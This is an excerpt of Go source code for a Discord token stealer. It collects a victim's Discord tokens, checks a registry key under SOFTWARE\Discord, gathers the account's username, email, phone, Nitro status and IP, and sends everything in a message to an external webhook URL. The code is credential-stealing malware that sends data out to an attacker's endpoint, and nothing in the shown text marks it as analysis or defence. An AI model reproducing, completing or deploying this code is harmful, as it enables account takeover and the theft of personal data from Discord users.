...
func GetAllTokens() {
	...
	for _, token := range tokenList {
		//dataKey, err := registry.OpenKey(registry.CURRENT_USER, `SOFTWARE\Discord`, registry.READ)
		//if err != nil {
		//	//fmt.Println("Failed to open registry key:", err)
		//	return
		//}
		//resData, _, err := dataKey.GetStringValue(valueName)
		//if err != nil {
		//	//	fmt.Println("Failed to get registry value:", err)
		//	CreateRegeditFile(valueName, "token")
		//}
		////	fmt.Println("Registry value read successfully:", resData)
		//if resData != token {
		//	err := sendEmbed(token)
		//	if err != nil {
		//		return
...
func grabTokenInformation(token string) discordStruct {
	...
	str.DiscordUser = "discordUser"
	str.DiscordEmail = "discordEmail"
	str.DiscordPhone = "discordPhone"
	str.DiscordNitro = "discordNitro"
	str.Ip = "ip"
...
func sendEmbed(token string) error {

	data, err := json.MarshalIndent(grabTokenInformation(token), "", "    ")
	if err != nil {
		fmt.Printf("Json Error: %s\n", err.Error())
	}

	content := string(data)
	str := fmt.Sprintf("You got new information about user:\n```\"%s\"```", content)
	//fmt.Println(str)

	discordReq, err := json.Marshal(discordRequest{Content: str})
	if err != nil {
		fmt.Printf("Json Error: %s\n", err.Error())
	}
	...
	err = retry.Do(
		func() error {
			var err error
			req, err := http.NewRequest("POST", WebhookUrl, bytes.NewBuffer(discordReq))
